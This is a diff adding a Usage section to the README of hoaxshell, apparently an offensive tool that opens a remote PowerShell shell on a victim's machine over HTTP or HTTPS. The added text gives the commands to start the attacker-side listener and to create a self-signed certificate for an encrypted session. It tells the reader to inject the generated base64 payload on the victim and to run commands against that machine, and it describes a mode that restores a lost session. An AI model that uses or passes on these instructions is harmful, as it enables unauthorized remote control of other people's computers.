@@ -27,5 +27,27 @@ chmod +x hoaxshell.py
 ```
 
 ## Usage
+#### Basic (shell session over http)
+```
+sudo python3 hoaxshell.py -s <your_ip>
+```  
+hoaxshell will generate the powershell payload automatically base64 encoded for you to copy and inject on the victim. If you need the payload raw, execute the "rawpayload" prompt command. After the payload has been executed on the victim, you'll be able to run powershell commands against it.
+
+#### Encrypted shell session (https):
+```
+# Generate self-signed certificate:
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
+
+# Pass the cert.pem and key.pem as arguments:
+sudo python3 hoaxshell.py -s <your_ip> -c cert.pem -k key.pem
+
+```  
+
+#### Restore session mode
+In case you close your terminal accidentally, have a power outage or something, you can start hoaxshell in restore mode, it will attempt to re-establish a session, given that the payload is still running on the victim machine.
+```
+sudo python3 hoaxshell.py -s <your_ip> -g
+```  
+
 
 
